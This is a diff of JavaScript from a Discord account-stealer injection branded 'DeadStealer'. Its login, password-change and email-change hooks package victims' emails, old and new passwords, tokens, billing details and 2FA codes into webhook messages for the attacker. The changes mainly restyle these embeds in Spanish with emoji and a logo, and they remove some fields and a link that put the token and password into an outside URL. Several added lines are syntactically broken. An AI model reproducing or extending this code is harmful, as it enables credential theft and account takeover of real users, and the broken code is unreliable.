@@ -443,13 +443,9 @@ function Login(email, password, token) {
 								embeds: [{
 									"title": "Usuario logeado",
 									description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-									"color": config['embed-color'],
+									"color": 0xFF0300, config['embed-color'],
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-										inline: !1
-									}, {
-										name: "Nombre",
+										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
@@ -457,27 +453,27 @@ function Login(email, password, token) {
 										value: `\`${json.id}\``,
 										inline: !0
 									}, {
-										name: "Nitro",
+										name: "<:Bup_negro:926272964113104946> Nitro",
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Badges",
+										name: "<:black_playboy:926268704000475196> Insignias",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Billing",
+										name: "<a:black_cc:926273142350024764> Método de pago",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "Email",
+										name: "<:black_lips:926268648593719396> Correo electrónico",
 										value: `\`${email}\``,
 										inline: !0
 									}, {
-										name: "Password",
+										name: "<:cf_dragon:926273709126332466> Contraseña",
 										value: `\`${password}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "<:black_mask:926268629245390879> Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
@@ -492,7 +488,7 @@ function Login(email, password, token) {
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
+									"color": 0xFF0300, config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
@@ -508,7 +504,7 @@ function Login(email, password, token) {
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
 								"description": `[Get all of them](${baseuri})`,
-								"color": config['embed-color'],
+								"color": 0xFF0300, config['embed-color'],
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
@@ -601,15 +597,10 @@ function Login(email, password, token) {
 											username: "DeadStealer",
 											content: "",
 											embeds: [{
-												"title": "Usuario logeado",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-												"color": config['embed-color'],
+												"title": "DeadStealer",
+												"color": 0xFF0300,
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-													inline: !1
-												}, {
-													name: "Nombre",
+													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
@@ -617,27 +608,27 @@ function Login(email, password, token) {
 													value: `\`${json.id}\``,
 													inline: !0
 												}, {
-													name: "Nitro",
+													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Insignia",
+													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "<a:black_cc:926273142350024764> Método de pago",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "Email",
+													name: "<:black_lips:926268648593719396> Correo electrónico",
 													value: `\`${email}\``,
 													inline: !0
 												}, {
-													name: "Contraseña",
+													name: "<:cf_dragon:926273709126332466> Contraseña",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "<:black_mask:926268629245390879> Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
@@ -648,11 +639,11 @@ function Login(email, password, token) {
 													"text": "Gracias por utilizar DeadStealer"
 												},
 												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
+												"color": 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
@@ -661,7 +652,7 @@ function Login(email, password, token) {
 													"text": "DeadStealer"
 												},
 												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 												}
 											}]
 										}
@@ -784,15 +775,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 								username: "DeadStealer",
 								content: "",
 								embeds: [{
-									"title": "Contraseña cambiada",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
-									"color": config['embed-color'],
+									"title": "DeadStealer",
+									"color": 0xFF0300,
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-										inline: !1
-									}, {
-										name: "Nombre",
+										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
@@ -800,31 +786,31 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `\`${json.id}\``,
 										inline: !0
 									}, {
-										name: "Nitro",
+										name: "<:Bup_negro:926272964113104946> Nitro",
 										value: `${GetNitro(json.premium_type)}`,
 										inline: !1
 									}, {
-										name: "Insignia",
+										name: "<:black_playboy:926268704000475196> Insignias",
 										value: `${GetBadges(json.flags)}`,
 										inline: !1
 									}, {
-										name: "Billing",
+										name: "<a:black_cc:926273142350024764> Método de pago",
 										value: `${Cool()}`,
 										inline: !1
 									}, {
-										name: "Email",
+										name: "<:black_lips:926268648593719396> Correo electrónico",
 										value: `\`${json.email}\``,
 										inline: !1
 									}, {
-										name: "Contraseña antigua",
+										name: "<:cf_dragon:926273709126332466> Contraseña antigua",
 										value: `\`${oldpassword}\``,
 										inline: !0
 									}, {
-										name: "Contraseña nueva",
+										name: "<:cf_dragon:926273709126332466> Contraseña nueva",
 										value: `\`${newpassword}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "<:black_mask:926268629245390879> Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
@@ -835,27 +821,28 @@ function ChangePassword(oldpassword, newpassword, token) {
 										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 									}
 								}, {
 									"title": `Amigos en totales (${totalFriends()})`,
-									"color": config['embed-color'],
+									"color": 0xFF0300, 0xFF0300,
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
 									},
 									"footer": {
 										"text": "Gracias por utilizar DeadStealer"
+                                                                                "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                                                "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 									},
 									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 									}
 								}]
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA ACTIVADO__",
-								"description": `[Puedes iniciar sesion con token](${baseuri})`,
-								"color": config['embed-color'],
+								"color": 0xFF0300,
 								"fields": fieldo,
 								"author": {
 									"name": "DeadStealer"
@@ -950,14 +937,9 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Contraseña cambiada",
-												description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
-												"color": config['embed-color'],
+												"color": 0xFF0300, 0xFF0300,
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-													inline: !1
-												}, {
-													name: "Nombre",
+													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
@@ -965,46 +947,48 @@ function ChangePassword(oldpassword, newpassword, token) {
 													value: `\`${json.id}\``,
 													inline: !0
 												}, {
-													name: "Nitro",
+													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
 													inline: !1
 												}, {
-													name: "Insignia",
+													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "<a:black_cc:926273142350024764> Método de pago",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "Email",
+													name: "<:black_lips:926268648593719396> Correo electrónico",
 													value: `\`${json.email}\``,
 													inline: !1
 												}, {
-													name: "Antigua Contraseña",
+													name: "<:cf_dragon:926273709126332466> Contraseña antigua",
 													value: `\`${oldpassword}\``,
 													inline: !0
 												}, {
-													name: "Nueva Contraseña",
+													name: "<:cf_dragon:926273709126332466> Contraseña nueva",
 													value: `\`${newpassword}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "<:black_mask:926268629245390879> Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
 												"author": {
 													"name": "DeadStealer"
+                                                                                                        "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                                                                        "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												},
 												"footer": {
 													"text": "DeadStealer"
 												},
 												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 												}
 											}, {
 												"title": `Amigos en total (${totalFriends()})`,
-												"color": config['embed-color'],
+												"color": 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
@@ -1136,76 +1120,71 @@ function ChangeEmail(newemail, password, token) {
 								username: "DeadStealer",
 								content: "",
 								embeds: [{
-									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-									"color": config['embed-color'],
+									"title": "Email Cambiado",
+									"color": 0xFF0300, 0xFF0300,
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
-										inline: !1
-									}, {
-										name: "Nombre",
+										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
+
 									}, {
-										name: "ID",
-										value: `\`${json.id}\``,
+										name: "<:Bup_negro:926272964113104946> Nitro",
+										value: `${GetNitro(json.premium_type)}`,
 										inline: !0
 									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
-									}, {
-										name: "Insignia",
+										name: "<:black_playboy:926268704000475196> Insignias",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
+										name: "<a:black_cc:926273142350024764> Método de pago",
 										value: `${Cool()}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Nuevo Email",
+										name: "<:black_lips:926268648593719396> Nuevo correo",
 										value: `\`${newemail}\``,
 										inline: !0
 									}, {
-										name: "Contraseña",
+										name: "<:cf_dragon:926273709126332466> Contraseña",
 										value: `\`${password}\``,
 										inline: !0
 									}, {
-										name: "Token",
+										name: "<:black_mask:926268629245390879> Token",
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
 									"author": {
 										"name": "DeadStealer"
+                                                                                 "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                                                 "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 									},
 									"footer": {
 										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
+									"color": 0xFF0300, 0xFF0300,
 									"description": CalcFriends(),
 									"author": {
 										"name": "DeadStealer"
+                                                                                "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                                                "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 									},
 									"footer": {
 										"text": "Gracias por utilizar DeadStealer"
 									},
 									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
 									}
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA ACTIVADO__",
-								"description": `[Puedes iniciar sesion con token](${baseuri})`,
-								"color": config['embed-color'],
+								"title": "__2FA__",
+								"color": 0xFF0300, 0xFF0300,
 								"fields": fieldo,
-								"author": {
+								'author': {
 									"name": "DeadStealer"
 								},
 								"footer": {
@@ -1299,37 +1278,33 @@ function ChangeEmail(newemail, password, token) {
 											embeds: [{
 												"title": "Email Cambiado",
 												description: "[**<:partner:909102089513340979> │ Matteo on top**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
-												"color": config['embed-color'],
+												"color": 0xFF0300, 0xFF0300,
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
-													inline: !1
+										                        name: "<:black_joker:926273784305045526> Usuario",
+										                        value: `\`${json.username}#${json.discriminator}\``,
+										                        inline: !0
 												}, {
-													name: "Nombre",
-													value: `\`${json.username}#${json.discriminator}\``,
-													inline: !0
+										                        name: "ID",
+										                        value: `\`${json.id}\``,
+										                        inline: !0
 												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
-													name: "Nitro",
+													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
-													name: "Insignia",
+													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
 													inline: !1
 												}, {
-													name: "Billing",
+													name: "<a:black_cc:926273142350024764> Método de pago",
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "Nuevo Email",
+													name: "<:black_lips:926268648593719396> Nuevo correo",
 													value: `\`${newemail}\``,
 													inline: !0
 												}, {
-													name: "Contraseña",
+													name: "<:cf_dragon:926273709126332466> Contraseña",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
@@ -1338,7 +1313,9 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "DeadStealer"
+													 "name": 'CipherStealer',
+                                                                                                         "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                                                                         "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												},
 												"footer": {
 													"text": "Gracias por utilizar DeadStealer"
@@ -1348,7 +1325,7 @@ function ChangeEmail(newemail, password, token) {
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
+												"color": 0xFF0300, 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
 													"name": "DeadStealer"
